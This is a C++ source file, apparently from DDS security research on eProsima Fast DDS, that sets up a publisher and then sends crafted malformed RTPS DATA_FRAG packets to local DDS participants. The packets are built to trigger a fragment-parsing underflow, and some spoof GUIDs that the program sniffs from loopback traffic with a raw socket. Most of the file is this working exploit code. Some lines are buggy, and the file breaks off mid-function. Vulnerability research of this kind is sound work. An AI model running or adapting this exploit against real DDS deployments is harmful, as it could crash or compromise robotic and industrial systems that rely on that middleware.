// Copyright 2016 Proyectos y Sistemas de Mantenimiento SL (eProsima).
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

/**
 * @file TestPuberCore.cpp
 * @brief TestPuber核心功能实现文件
 * 
 * 本文件包含了从main函数开始被使用的所有核心方法实现。
 * 这些方法是从Test4Puber.cpp中提取出来的，用于分离核心功能。
 */

#include "TestPuberCore.hpp"
#include <fastdds/rtps/transport/UDPv4TransportDescriptor.hpp>
#include <iostream>
#include <chrono>
#include <thread>
#include <fstream>
#include <iomanip>
#include <sstream>
#include <random>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <cstring>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <netinet/ether.h>

using namespace eprosima::fastdds::dds;
using namespace eprosima::fastdds::rtps;

// 静态成员变量定义
const uint32_t PUBLISH_INTERVAL_MS = 600;

// 构造函数
TestPuberCore::TestPuberCore()
    : participant_(nullptr)
    , publisher_(nullptr)
    , topic_(nullptr)
    , writer_(nullptr)
    , type_(new HelloWorldPubSubType())
    , udp_listener_running_(false)
{
}

// 析构函数
TestPuberCore::~TestPuberCore()
{
    if (writer_ != nullptr)
    {
        publisher_->delete_datawriter(writer_);
    }
    if (publisher_ != nullptr)
    {
        participant_->delete_publisher(publisher_);
    }
    if (topic_ != nullptr)
    {
        participant_->delete_topic(topic_);
    }
    DomainParticipantFactory::get_instance()->delete_participant(participant_);
    
    // 关闭期望接收日志文件
    if (expected_reception_log_file_.is_open()) {
        expected_reception_log_file_.close();
    }
    
    // 停止UDP监听器
    stopUDPListener();
    
    // 关闭UDP监听日志文件
    if (udp_listener_log_file_.is_open()) {
        udp_listener_log_file_.close();
    }
}

// 初始化方法
bool TestPuberCore::init()
{
    std::cout << "开始初始化Publisher..." << std::endl;
    
    DomainParticipantQos participantQos;
    participantQos.name("Participant_publisher");
    
    // 配置传输方式：禁用共享内存，强制使用UDP
    std::cout << "配置传输方式：禁用共享内存，使用UDP传输..." << std::endl;
    
    // 创建UDP传输描述符
    auto udp_transport = std::make_shared<UDPv4TransportDescriptor>();
    
    // 清除默认传输并添加UDP传输
    participantQos.transport().use_builtin_transports = false;
    participantQos.transport().user_transports.push_back(udp_transport);
    
    std::cout << "创建DomainParticipant..." << std::endl;
    participant_ = DomainParticipantFactory::get_instance()->create_participant(0, participantQos);

    if (participant_ == nullptr)
    {
        std::cout << "DomainParticipant创建失败！" << std::endl;
        return false;
    }
    std::cout << "DomainParticipant创建成功" << std::endl;

    // Register the Type
    std::cout << "注册类型..." << std::endl;
    type_.register_type(participant_);
    std::cout << "类型注册完成" << std::endl;

    // Create the publications Topic
    std::cout << "创建Topic..." << std::endl;
    TopicQos tqos;
    std::cout << "应用Topic QoS配置..." << std::endl;
    try {
        qos_manager_.applyTopicQoS(tqos);
        std::cout << "  ✓ Topic QoS应用成功" << std::endl;
    } catch (const std::exception& e) {
        std::cout << "  ✗ Topic QoS应用失败: " << e.what() << std::endl;
        return false;
    }

    topic_ = participant_->create_topic("HelloWorldTopic", "HelloWorld", tqos);

    if (topic_ == nullptr)
    {
        std::cout << "Topic创建失败！" << std::endl;
        return false;
    }
    std::cout << "Topic创建成功" << std::endl;

    // Create the Publisher
    std::cout << "创建Publisher..." << std::endl;
    PublisherQos pqos;
    std::cout << "应用Publisher QoS配置..." << std::endl;
    try {
        qos_manager_.applyPublisherQoS(pqos);
        std::cout << "  ✓ Publisher QoS应用成功" << std::endl;
    } catch (const std::exception& e) {
        std::cout << "  ✗ Publisher QoS应用失败: " << e.what() << std::endl;
        return false;
    }
    publisher_ = participant_->create_publisher(pqos, nullptr);

    if (publisher_ == nullptr)
    {
        std::cout << "Publisher创建失败！" << std::endl;
        return false;
    }
    std::cout << "Publisher创建成功" << std::endl;

    // Create the DataWriter
    std::cout << "创建DataWriter..." << std::endl;
    DataWriterQos wqos;
    std::cout << "应用DataWriter QoS配置..." << std::endl;
    try {
        qos_manager_.applyDataWriterQoS(wqos);
        std::cout << "  ✓ DataWriter QoS应用成功" << std::endl;
    } catch (const std::exception& e) {
        std::cout << "  ✗ DataWriter QoS应用失败: " << e.what() << std::endl;
        return false;
    }

    // 添加超时机制
    std::cout << "开始创建DataWriter，设置10秒超时..." << std::endl;
    auto start_time = std::chrono::steady_clock::now();
    
    // 临时移除监听器，测试是否是监听器导致的问题
    //writer_ = publisher_->create_datawriter(topic_, wqos, nullptr);
    writer_ = publisher_->create_datawriter(topic_, wqos, &listener_);
    
    auto end_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time);
    std::cout << "DataWriter创建耗时: " << duration.count() << " 秒" << std::endl;

    if (writer_ == nullptr)
    {
        std::cout << "DataWriter创建失败！" << std::endl;
        return false;
    }
    std::cout << "DataWriter创建成功" << std::endl;
    
    
    // 从JSON文件读取DataReader的GUID信息
    readDataReaderGUIDFromJson();
    
    // 启动UDP监听器
    if (!startUDPListener()) {
        std::cout << "警告：UDP监听器启动失败，但Publisher初始化继续..." << std::endl;
    }
    
    std::cout << "Publisher初始化完成！" << std::endl;
    return true;
}

// 配置QoS方法
void TestPuberCore::configureQoS()
{
    // 获取QoS管理器并配置各种QoS策略
    QoSManager& qos_manager = getQoSManager();
    
    std::cout << "\n=== 配置Publisher QoS策略 ===" << std::endl;
    
    // 1. 可靠性策略配置
    std::cout << "1. 设置可靠性策略..." << std::endl;
    // qos_manager.setReliability(RELIABLE_RELIABILITY_QOS);
    qos_manager.setReliability(BEST_EFFORT_RELIABILITY_QOS);
    
    // 2. Topic历史深度配置
    std::cout << "2. 设置Topic历史深度..." << std::endl;
    qos_manager.setTopicHistoryDepth(20);
    
    // 3. Topic持久性策略配置
    std::cout << "3. 设置Topic持久性策略..." << std::endl;
    qos_manager.setTopicDurability(VOLATILE_DURABILITY_QOS);
    
    // 4. 分区配置
    std::cout << "4. 设置分区名称..." << std::endl;
    qos_manager.setPartition("default_partition");
    
    // 5. 用户数据配置
    std::cout << "5. 设置用户数据..." << std::endl;
    const uint8_t user_data[] = {1, 2, 3, 4};
    qos_manager.setUserData(std::vector<uint8_t>(user_data, user_data + sizeof(user_data)/sizeof(user_data[0])));
    
    // 6. 时间相关配置
    std::cout << "6. 设置时间相关参数..." << std::endl;
    
    // 截止时间
    Duration_t deadline_period;
    deadline_period.seconds = 3600;
    deadline_period.nanosec = 0;
    qos_manager.setDeadline(deadline_period);
    
    // 生命周期
    Duration_t lifespan_duration;
    lifespan_duration.seconds = 3600;
    lifespan_duration.nanosec = 0;
    qos_manager.setLifespan(lifespan_duration);
    
    // 延迟预算
    Duration_t latency_budget;
    latency_budget.seconds = 1; // 修复溢出问题
    latency_budget.nanosec = 100000; // 100微秒
    qos_manager.setLatencyBudget(latency_budget);
    std::cout << "   延迟预算配置完成" << std::endl;
    
    // 7. 活跃性策略配置（必须与Subscriber匹配）
    std::cout << "7. 设置活跃性策略..." << std::endl;
    Duration_t liveliness_duration;
    liveliness_duration.seconds = 10;
    liveliness_duration.nanosec = 0;
    qos_manager.setLiveliness(AUTOMATIC_LIVELINESS_QOS, liveliness_duration);
    
    // 8. 所有权策略配置（必须与Subscriber匹配）
    std::cout << "8. 设置所有权策略..." << std::endl;
    qos_manager.setOwnership(SHARED_OWNERSHIP_QOS, 999999);
}
GUID_t TestPuberCore::getWriterGUID() const
{
    if (writer_ != nullptr) {
        return writer_->guid();
    }
    return GUID_t();
}
// 运行方法
void TestPuberCore::run(uint32_t samples)
{
    try {
        std::cout << "等待Subscriber连接..." << std::endl;
        
        // 等待匹配的Subscriber
        int wait_count = 0;
        const int max_wait = 3000; // 最多等待3000次，每次10毫秒
        // while (listener_.matched_ == 0 && wait_count < max_wait)
        // {
        //     std::cout << "等待匹配中... (" << wait_count + 1 << "/" << max_wait << ")" << std::endl;
        //     std::this_thread::sleep_for(std::chrono::milliseconds(2)); // 改为10毫秒，提高响应速度
        //     wait_count++;
        // }
        // //跳出循环的时间戳打印
        // auto now = std::chrono::steady_clock::now();
        // auto time_ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count();
        // std::cout << "跳出循环的时间戳: " << time_ms << std::endl;
        if (listener_.matched_ == 0)
        {
            std::cout << "警告：没有找到匹配的Subscriber，但仍将继续发送消息..." << std::endl;
        }
        else
        {
            std::cout << "成功匹配到 " << listener_.matched_ << " 个Subscriber" << std::endl;
        }

       
        for (size_t i = 0; i < 100; ++i) {
            try {
                
                // 运行漏洞测试
                runVulnerabilityTests(i);
                
                // 每10次循环打印一次发现的Writer信息
                if (i % 10 == 0) {
                    printDiscoveredWriters();
                }
                
                std::this_thread::sleep_for(std::chrono::milliseconds(PUBLISH_INTERVAL_MS));
                
            } catch (const std::exception& e) {
                std::cout << "错误：处理消息 " << i << " 时发生异常: " << e.what() << std::endl;
                std::cout << "继续处理下一个消息..." << std::endl;
                continue; // 继续处理下一个消息
            } catch (...) {
                std::cout << "错误：处理消息 " << i << " 时发生未知异常" << std::endl;
                std::cout << "继续处理下一个消息..." << std::endl;
                continue; // 继续处理下一个消息
            }
        }
        std::cout << "run函数执行完成" << std::endl;
        
    } catch (const std::exception& e) {
        std::cout << "严重错误：run函数执行过程中发生异常: " << e.what() << std::endl;
        std::cout << "程序将尝试继续运行..." << std::endl;
    } catch (...) {
        std::cout << "严重错误：run函数执行过程中发生未知异常" << std::endl;
        std::cout << "程序将尝试继续运行..." << std::endl;
    }
}


// 从JSON读取DataReader GUID信息方法
void TestPuberCore::readDataReaderGUIDFromJson()
{
    std::cout << "\n=== 从JSON文件读取DataReader GUID信息 ===" << std::endl;
    
    // 使用公共方法读取JSON
    GUIDInfo guid_info = readGUIDFromJson();
    
   
    // 构建完整的GUID前缀
    if (!guid_info.host_id.empty() && !guid_info.app_id.empty() && !guid_info.instance_id.empty())
    {
        // 转换为字节数组
        std::vector<uint8_t> guid_prefix_bytes;
        guid_prefix_bytes.push_back(0x01); // VendorId
        guid_prefix_bytes.push_back(0x0f);
        
        // HostId (4字节)
        for (int i = 0; i < 4; ++i)
        {
            std::string byte_str = guid_info.host_id.substr(i * 2, 2);
            uint8_t byte_val = static_cast<uint8_t>(std::stoi(byte_str, nullptr, 16));
            guid_prefix_bytes.push_back(byte_val);
        }
        
        // AppId (4字节)
        for (int i = 0; i < 4; ++i)
        {
            std::string byte_str = guid_info.app_id.substr(i * 2, 2);
            uint8_t byte_val = static_cast<uint8_t>(std::stoi(byte_str, nullptr, 16));
            guid_prefix_bytes.push_back(byte_val);
        }
        
        // InstanceId (4字节)
        for (int i = 0; i < 4; ++i)
        {
            std::string byte_str = guid_info.instance_id.substr(i * 2, 2);
            uint8_t byte_val = static_cast<uint8_t>(std::stoi(byte_str, nullptr, 16));
            guid_prefix_bytes.push_back(byte_val);
        }
    }
}

// 读取GUID从JSON方法
TestPuberCore::GUIDInfo TestPuberCore::readGUIDFromJson(const std::string& json_file_path) const
{
    GUIDInfo guid_info;
    
    
    std::ifstream json_file(json_file_path);
    if (!json_file.is_open()) {
        std::cout << "无法打开JSON文件: " << json_file_path << std::endl;
        return guid_info;
    }
    
    std::string line;
    while (std::getline(json_file, line)) {
        // 简单的JSON解析，查找host_id, app_id, instance_id
        if (line.find("\"host_id\"") != std::string::npos) {
            size_t start = line.find(": \"") + 3;
            size_t end = line.find("\"", start);
            if (start != std::string::npos && end != std::string::npos) {
                guid_info.host_id = line.substr(start, end - start);
            }
        }
        else if (line.find("\"app_id\"") != std::string::npos) {
            size_t start = line.find(": \"") + 3;
            size_t end = line.find("\"", start);
            if (start != std::string::npos && end != std::string::npos) {
                guid_info.app_id = line.substr(start, end - start);
            }
        }
        else if (line.find("\"instance_id\"") != std::string::npos) {
            size_t start = line.find(": \"") + 3;
            size_t end = line.find("\"", start);
            if (start != std::string::npos && end != std::string::npos) {
                guid_info.instance_id = line.substr(start, end - start);
            }
        }
    }
    
    json_file.close();
    return guid_info;
}

// 运行漏洞测试方法
void TestPuberCore::runVulnerabilityTests(int test_id) {
    runDataFragUnderflowTestSuite(test_id);
}

// 运行DATA_FRAG下溢测试套件方法
void TestPuberCore::runDataFragUnderflowTestSuite(int test_id) {
    
    
    // 1. 基本DATA_FRAG下溢测试（使用默认GUID）
    auto datafrag_underflow_packet = generateDataFragUnderflowPacket(test_id);
    sendVulnerabilityTestPacket(datafrag_underflow_packet, "DATA_FRAG下溢测试", test_id++);
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
    
    // 2. 使用发现的GUID进行测试
    std::lock_guard<std::mutex> lock(discovered_writers_mutex_);
    for (size_t i = 0; i < discovered_writers_.size() && i < 3; ++i) { // 最多测试前3个发现的GUID
        const auto& discovered_writer = discovered_writers_[i];
        std::cout << "使用发现的GUID #" << (i + 1) << " 进行DATA_FRAG下溢测试..." << std::endl;
        
        auto guid_based_packet = generateDataFragUnderflowPacket(test_id, &discovered_writer.writer_guid);
        sendVulnerabilityTestPacket(guid_based_packet, 
                                   "基于发现GUID的DATA_FRAG下溢测试_" + std::to_string(i + 1), 
                                   test_id++);
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}
// HandmadeRTPSPacket方法实现
// RTPS Magic Header (4字节)
char* HandmadeRTPSPacket::magic_head(char* magic_head)
{
    magic_head[0] = 'R';
    magic_head[1] = 'T';
    magic_head[2] = 'P';
    magic_head[3] = 'S';
    return magic_head;
}

// Protocol Version (2字节)
char* HandmadeRTPSPacket::protocol_version(char* protocol_version)
{
    protocol_version[0] = 0x02; // Major version
    protocol_version[1] = 0x02; // Minor version
    return protocol_version;
}

// Vendor ID (2字节) - 从DataWriter获取
char* HandmadeRTPSPacket::vendorId(char* vendor_id)
{
    if (puber_ != nullptr)
    {
        auto writer_guid = puber_->getWriterGUID();
        vendor_id[0] = writer_guid.guidPrefix.value[0];
        vendor_id[1] = writer_guid.guidPrefix.value[1];
    }
    else
    {
        // 默认值
        vendor_id[0] = 0x01; // eProsima vendor ID
        vendor_id[1] = 0x0f;
    }
    return vendor_id;
}

// GUID Prefix (12字节) - 从DataWriter获取
char* HandmadeRTPSPacket::guidprefix(char* guid_prefix)
{
    if (external_guid_ != nullptr)
    {
        // 使用外部提供的GUID
        for (int i = 0; i < 12; ++i)
        {
            guid_prefix[i] = external_guid_->guidPrefix.value[i];
        }
    }
    else if (puber_ != nullptr)
    {
        auto writer_guid = puber_->getWriterGUID();
        // 复制完整的14字节GUID前缀
        for (int i = 0; i < 12; ++i)
        {
            guid_prefix[i] = writer_guid.guidPrefix.value[i];
        }
    }
    else
    {
        // 默认值
        for (int i = 0; i < 12; ++i)
        {
            guid_prefix[i] = 0x00;
        }
    }
    return guid_prefix;
}

// 生成当前UTC时间戳（8字节）
char* HandmadeRTPSPacket::generateUTCTimestamp(char* timestamp)
{
    // 获取当前UTC时间
    auto now = std::chrono::system_clock::now();
    auto duration = now.time_since_epoch();
    
    // 转换为秒和纳秒
    auto seconds = std::chrono::duration_cast<std::chrono::seconds>(duration);
    auto nanoseconds = std::chrono::duration_cast<std::chrono::nanoseconds>(duration - seconds);
    
    // RTPS时间戳格式：8字节，前4字节是秒数，后4字节是纳秒数（小端序）
    uint32_t sec = static_cast<uint32_t>(seconds.count());
    uint32_t nsec = static_cast<uint32_t>(nanoseconds.count());
    
    // 小端序存储
    timestamp[0] = static_cast<char>(sec & 0xFF);
    timestamp[1] = static_cast<char>((sec >> 8) & 0xFF);
    timestamp[2] = static_cast<char>((sec >> 16) & 0xFF);
    timestamp[3] = static_cast<char>((sec >> 24) & 0xFF);
    
    timestamp[4] = static_cast<char>(nsec & 0xFF);
    timestamp[5] = static_cast<char>((nsec >> 8) & 0xFF);
    timestamp[6] = static_cast<char>((nsec >> 16) & 0xFF);
    timestamp[7] = static_cast<char>((nsec >> 24) & 0xFF);
    
    return timestamp;
}
// 生成DATA_FRAG下溢测试数据包方法
std::vector<char> TestPuberCore::generateDataFragUnderflowPacket(int seq_num, const GUID_t* target_guid) {
    std::cout << "生成DATA_FRAG下溢测试数据包..." << std::endl;
    if (target_guid != nullptr) {
        std::cout << "使用目标GUID: " << *target_guid << std::endl;
    } else {
        std::cout << "使用默认GUID" << std::endl;
    }
    
    // 使用HandmadeRTPSPacket来获取正确的GUID和EntityID
    HandmadeRTPSPacket packet_builder(this, target_guid);
    std::vector<char> rtps_message;
    char timestamp[8];
    packet_builder.generateUTCTimestamp(timestamp);
    // 1. RTPS Header (20字节) - 复用sendUDPPacket的逻辑
    char magic[4];
    packet_builder.magic_head(magic);
    rtps_message.insert(rtps_message.end(), magic, magic + 4);
    
    char version[2];
    packet_builder.protocol_version(version);
    rtps_message.insert(rtps_message.end(), version, version + 2);
    
    char vendor[2];
    packet_builder.vendorId(vendor);
    rtps_message.insert(rtps_message.end(), vendor, vendor + 2);
    
    char guid_prefix[12];
    packet_builder.guidprefix(guid_prefix);
    rtps_message.insert(rtps_message.end(), guid_prefix, guid_prefix + 12);
    //Info_TS submessage
    rtps_message.push_back(0x09); // INFO_TS
    rtps_message.push_back(0x01); // Flags
    rtps_message.push_back(0x08); // Length
    rtps_message.push_back(0x00); // Length high byte
    rtps_message.insert(rtps_message.end(), timestamp, timestamp + 8);
    // 2. DATA_FRAG Submessage - 根据proc_Submsg_DataFrag的解析过程构造
    //将0xffff个子消息拼接到一起
    for(int i = 0; i < 0x330; i++) {
        // Submessage ID (1字节)
        rtps_message.push_back(0x16); // DATA_FRAG
        
        // Flags (1字节) - endianness + inline QoS flag
        rtps_message.push_back(0x03); // 0x01 (endianness) + 0x02 (inline QoS flag)
        
        // 临时长度占位符，稍后更新
        rtps_message.push_back(0x24); // Length low byte (temporary)
        rtps_message.push_back(0x00); // Length high byte (temporary)
        
        // Extra flags (2字节) - 跳过，不影响解析
        rtps_message.push_back(0x00);
        rtps_message.push_back(0x00);
        
        // Octets to inline QoS (2字节) - 指向实际内联QoS数据的起始位置
        // 计算：1(ID) + 1(Flags) + 2(Length) + 2(Extra flags) + 2(octetsToInlineQos) + 4(Reader ID) + 4(Writer ID) + 8(SeqNum) + 4(FragmentNum) + 2(FragmentsInSubmsg) + 2(FragmentSize) + 4(SampleSize) = 36字节
        rtps_message.push_back(0x1c); // 28字节，低字节
        rtps_message.push_back(0x00); // 28字节，高字节
        
        // Reader Entity ID (4字节) - 使用与sendUDPPacket相同的值
        rtps_message.push_back(0x00);
        rtps_message.push_back(0x00);
        rtps_message.push_back(0x01);
        rtps_message.push_back(0x04);
        
        // Writer Entity ID (4字节) - 使用与sendUDPPacket相同的值
        rtps_message.push_back(0x00);
        rtps_message.push_back(0x00);
        rtps_message.push_back(0x01);
        rtps_message.push_back(0x03);
        
        // Sequence Number (8字节) - 使用小端序
        uint32_t seq_num = 10000000 + seq_num;
        for (int i = 0; i < 4; ++i) {
            rtps_message.push_back(0x00); // high 4 bytes
        }
        for (int i = 0; i < 4; ++i) {
            rtps_message.push_back(static_cast<char>((seq_num >> (i * 8)) & 0xFF)); // low 4 bytes, little endian
        }
        
        // Fragment Number (4字节) - 小端序
        uint32_t fragment_num = 1+i;
        for (int i = 0; i < 4; ++i) {
            rtps_message.push_back(static_cast<char>((fragment_num >> (i * 8)) & 0xFF));
        }
        
        // Fragments in Submessage (2字节) - 小端序
        uint16_t fragments_in_submsg = 0x330;
        rtps_message.push_back(static_cast<char>(fragments_in_submsg & 0xFF));
        rtps_message.push_back(static_cast<char>((fragments_in_submsg >> 8) & 0xFF));
        
        // Fragment Size (2字节) - 小端序
        uint16_t fragment_size = 0xffff;
        rtps_message.push_back(static_cast<char>(fragment_size & 0xFF));
        rtps_message.push_back(static_cast<char>((fragment_size >> 8) & 0xFF));
        
        // Sample Size (4字节) - 小端序
        uint32_t sample_size = 0x32FFCD0;
        for (int i = 0; i < 4; ++i) {
            rtps_message.push_back(static_cast<char>((sample_size >> (i * 8)) & 0xFF));
        }
        
        // 内联QoS数据 - 构造一个大的内联QoS数据来触发下溢
        // 使用正确的ParameterList格式：每个参数包含2字节PID + 2字节长度 + 参数数据
        std::vector<char> inline_qos_data;
        
        // 参数1：构造一个完整的submessage结构作为参数内容
        std::vector<char> submessage_data;
        
        // 构造一个INFO_TS submessage作为参数内容
        // Submessage ID (1字节) - INFO_TS = 0x09
        submessage_data.push_back(0x09); // INFO_TS
        
        // Flags (1字节) - endianness flag
        submessage_data.push_back(0x01); // 小端序
        
        // Length (2字节) - 临时占位符
        submessage_data.push_back(0x08); // Length low byte (temporary)
        submessage_data.push_back(0x00); // Length high byte (temporary)
        
        // INFO_TS specific data
        // Timestamp (8字节) - 构造一个时间戳
        
        submessage_data.insert(submessage_data.end(), timestamp, timestamp + 8);
        // 更新submessage长度
        uint16_t submsg_length = submessage_data.size() - 4; // 减去头部4字节
        submessage_data[2] = static_cast<char>(submsg_length & 0xFF);
        submessage_data[3] = static_cast<char>((submsg_length >> 8) & 0xFF);
        
        // 将submessage数据转换为字符串
        std::string large_param(submessage_data.begin(), submessage_data.end());
        
        // // 如果submessage太小，扩展它
        // if (large_param.length() < 200) {
        //     large_param.resize(200, 'A'); // 扩展到200字节
        // }
        
        // 参数ID (2字节，小端序) - 使用一个有效的参数ID
        // PID_KEY_HASH = 0x0050, PID_STATUS_INFO = 0x0075 等是有效的参数ID
        uint16_t param_id = 0x0050; // PID_KEY_HASH
        inline_qos_data.push_back(static_cast<char>(param_id & 0xFF));
        inline_qos_data.push_back(static_cast<char>((param_id >> 8) & 0xFF));
        
        // 参数长度 (2字节，小端序) - 参数数据的长度
        uint16_t param_length = large_param.length()*3;
        inline_qos_data.push_back(static_cast<char>(param_length & 0xFF));
        inline_qos_data.push_back(static_cast<char>((param_length >> 8) & 0xFF));
        
        // 参数数据
        inline_qos_data.insert(inline_qos_data.end(), large_param.begin(), large_param.end());
        inline_qos_data.insert(inline_qos_data.end(), large_param.begin(), large_param.end());
        inline_qos_data.insert(inline_qos_data.end(), large_param.begin(), large_param.end());
        // 4字节对齐 - 确保整个参数（包括PID、长度和数据）对齐到4字节边界
        size_t current_size = inline_qos_data.size();
        size_t aligned_size = (current_size + 3) & ~3;
        while (inline_qos_data.size() < aligned_size) {
            inline_qos_data.push_back(0x00);
        }
        
        // 添加参数结束标记 (PID_SENTINEL = 0x0001)
        inline_qos_data.push_back(0x01); // PID_SENTINEL 低字节
        inline_qos_data.push_back(0x00); // PID_SENTINEL 高字节
        inline_qos_data.push_back(0x00); // 长度0 低字节
        inline_qos_data.push_back(0x00); // 长度0 高字节
        
        // 将内联QoS数据添加到submessage
        rtps_message.insert(rtps_message.end(), inline_qos_data.begin(), inline_qos_data.end());
    }
    // 计算实际submessage长度并更新占位符
    size_t submessage_start = 20;
    size_t submessage_length = 24;
    // //size_t submessage_length = rtps_message.size() - submessage_start;
    // rtps_message[submessage_start + 2] = static_cast<char>(submessage_length & 0xFF);
    // rtps_message[submessage_start + 3] = static_cast<char>((submessage_length >> 8) & 0xFF);
    
    
    return rtps_message;
}

// 发送漏洞测试数据包方法
void TestPuberCore::sendVulnerabilityTestPacket(const std::vector<char>& test_packet, 
                                               const std::string& test_name,
                                               int test_id) {
    std::cout << "发送漏洞测试数据包: " << test_name << " (ID: " << test_id << ")" << std::endl;
    std::cout << "数据包大小: " << test_packet.size() << " 字节" << std::endl;
    
    // 创建UDP socket
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        std::cout << "创建socket失败" << std::endl;
        return;
    }
    
    // 选择端口：优先使用最近监听到的dst端口，否则回退到默认7411
    int port = last_observed_dst_port_.load(std::memory_order_relaxed);
    std::cout << "最近监听到的dst端口: " << port << std::endl;
    if (port < 7400 || port > 7500) {
        port = 7411;
    }
    
    // 绑定源地址为127.0.0.1:port
    struct sockaddr_in src_addr; memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    src_addr.sin_port = htons(45345);
    // 允许端口共享
    int opt = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    
    if (bind(sockfd, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
        std::cout << "绑定源地址失败(端口占用或权限): " << port << std::endl;
        close(sockfd);
        return;
    }
    
    // 设置目标地址
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    dest_addr.sin_port = htons(port);
    
    // 发送数据包
    ssize_t bytes_sent = sendto(sockfd, test_packet.data(), test_packet.size(), 0,
                               (struct sockaddr*)&dest_addr, sizeof(dest_addr));
    
    if (bytes_sent < 0) {
        std::cout << "发送数据包失败" << std::endl;
    } else {
        std::cout << "成功发送 " << bytes_sent << " 字节" << std::endl;
    }
    
    close(sockfd);
}

// 生成指定的十六进制字符串方法
std::vector<char> TestPuberCore::generateSpecificHexString() {
    std::cout << "生成指定的十六进制字符串..." << std::endl;
    
    // 指定的十六进制字符串：00 01 00 00 01 00 00 00 0a 00 00 00 30 31 32 33 34 35 36 37 38 39 00 00 09 00 00 00 41 42 43 44 45 46 47 48 49 00 00 00
    // std::vector<char> hex_string = {
    //     0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    //     0x0c, 0x00, 0x00, 0x00, 0x61, 0x62, 0x63, 0x64,
    //     0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x00, 0x00,
    //     0x09, 0x00, 0x00, 0x00, 0x41, 0x42, 0x43, 0x44,
    //     0x45, 0x46, 0x47, 0x48, 0x49, 0x00, 0x00, 0x00
    // };
    std::vector<char> hex_string = {
        0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00
    };
    
    std::cout << "生成的十六进制字符串长度: " << hex_string.size() << " 字节" << std::endl;
    std::cout << "十六进制内容: ";
    for (size_t i = 0; i < hex_string.size(); ++i) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') 
                  << static_cast<int>(static_cast<unsigned char>(hex_string[i])) << " ";
    }
    std::cout << std::dec << std::endl;
    
    // 打印ASCII内容（可打印字符）
    std::cout << "ASCII内容: ";
    for (size_t i = 0; i < hex_string.size(); ++i) {
        char c = hex_string[i];
        if (c >= 32 && c <= 126) { // 可打印ASCII字符
            std::cout << c;
        } else {
            std::cout << "."; // 不可打印字符用点表示
        }
    }
    std::cout << std::endl;
    
    return hex_string;
}

// 获取Writer GUID方法


// 获取Participant GUID方法
GUID_t TestPuberCore::getParticipantGUID() const
{
    if (participant_ != nullptr) {
        return participant_->guid();
    }
    return GUID_t();
}

// 监听器回调实现
void TestPuberCore::PubListener::on_publication_matched(
        DataWriter*,
        const PublicationMatchedStatus& info)
{
    if (info.current_count_change == 1)
    {
        matched_ = info.total_count;
        std::cout << "Publisher匹配成功，当前匹配数: " << matched_ << std::endl;
    }
    else if (info.current_count_change == -1)
    {
        matched_ = info.total_count;
        std::cout << "Publisher匹配断开，当前匹配数: " << matched_ << std::endl;
    }
    else
    {
        std::cout << "Publisher匹配状态变化: " << info.current_count_change 
                  << ", 总匹配数: " << info.total_count << std::endl;
    }
}

int main(int argc, char** argv)
{
    sleep(0.5);
    std::cout << "Starting publisher with core functionality." << std::endl;
    
    // 初始化π值（在程序开始时计算一次）
    //initializePiDigits();
    
    uint32_t samples = 10000;

    TestPuberCore* mypub = new TestPuberCore();
    std::cout << "TestPuberCore created." << std::endl;
    
    mypub->configureQoS();
    std::cout << "QoS configured." << std::endl;
    
    // 配置UDP监听器
    UDPListenerConfig udp_config;
    udp_config.start_port = 7400;
    udp_config.end_port = 7500;
    udp_config.enable_listening = true;
    udp_config.log_file = "udp_listener.log";
    udp_config.timeout_ms = 1000;
    mypub->configureUDPListener(udp_config);
    std::cout << "UDP监听器配置完成." << std::endl;
    
    if(mypub->init())
    {
        std::cout << "Init success, running..." << std::endl;
        
        // 配置扩展模糊测试参数 - 启用多种变异策略
        
        // 运行发布者（现在包含模糊测试）
        mypub->run(samples);
    }
    else
    {
        std::cout << "Init failed." << std::endl;
    }

    std::cout << "About to delete mypub..." << std::endl;
    delete mypub;
    std::cout << "mypub deleted, exiting." << std::endl;
    return 0;
}

// ==================== UDP监听相关方法实现 ====================

// 配置UDP监听器
void TestPuberCore::configureUDPListener(const UDPListenerConfig& config)
{
    udp_listener_config_ = config;
    std::cout << "UDP监听器配置完成：" << std::endl;
    std::cout << "  监听端口范围: " << config.start_port << "-" << config.end_port << std::endl;
    std::cout << "  日志文件: " << config.log_file << std::endl;
    std::cout << "  超时时间: " << config.timeout_ms << "ms" << std::endl;
}

// 启动UDP监听器
bool TestPuberCore::startUDPListener()
{
    if (!udp_listener_config_.enable_listening) {
        std::cout << "抓包监听已禁用" << std::endl;
        return true;
    }
    std::cout << "直接启用AF_PACKET抓包监听(lo, UDP dst 7401-7500)..." << std::endl;
    return startRawListener();
}

// pcap监听启动
// 原始套接字监听启动
bool TestPuberCore::startRawListener()
{
    udp_listener_running_ = true;
    udp_listener_thread_ = std::thread(&TestPuberCore::rawListenerThreadFunction, this);
    std::cout << "启动AF_PACKET原始套接字监听(lo, 过滤UDP dst 7401-7500)..." << std::endl;
    return true;
}

// 停止UDP监听器
void TestPuberCore::stopUDPListener()
